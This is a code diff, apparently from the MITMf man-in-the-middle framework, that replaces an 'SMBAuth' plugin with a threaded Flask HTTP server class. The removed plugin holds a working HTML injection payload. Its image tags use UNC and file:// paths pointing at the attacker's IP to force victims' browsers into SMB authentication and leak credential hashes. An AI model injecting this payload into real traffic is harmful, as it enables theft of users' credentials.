@@ -18,24 +18,30 @@
 # USA
 #
 
-from core.utils import SystemConfig
-from plugins.plugin import Plugin
-from plugins.Inject import Inject
+import logging
+import sys
+import threading
 
-class SMBAuth(Inject, Plugin):
-    name     = "SMBAuth"
-    optname  = "smbauth"
-    desc     = "Evoke SMB challenge-response auth attempts"
-    version  = "0.1"
-    has_opts = False
+from core.configwatcher import ConfigWatcher
+from flask import Flask
 
-    def initialize(self, options):
-        self.target_ip = SystemConfig.getIP(options.interface)
+class HTTPserver:
 
-        Inject.initialize(self, options)
-        self.html_payload = self._get_data()
+    _instance = None
+    server = Flask(__name__)
+    port = int(ConfigWatcher.getInstance().config['MITMf']['HTTP']['port'])
 
-    def _get_data(self):
-        return '<img src=\"\\\\%s\\image.jpg\">'\
-                '<img src=\"file://///%s\\image.jpg\">'\
-                '<img src=\"moz-icon:file:///%%5c/%s\\image.jpg\">' % tuple([self.target_ip]*3)
+    @staticmethod
+    def getInstance():
+        if HTTPserver._instance is None:
+            HTTPserver._instance = HTTPserver()
+
+        return HTTPserver._instance
+
+    def startFlask(self):
+        self.server.run(host='0.0.0.0', port=self.port)
+
+    def start(self):
+        server_thread = threading.Thread(name='HTTPserver', target=self.startFlask)
+        server_thread.setDaemon(True)
+        server_thread.start()
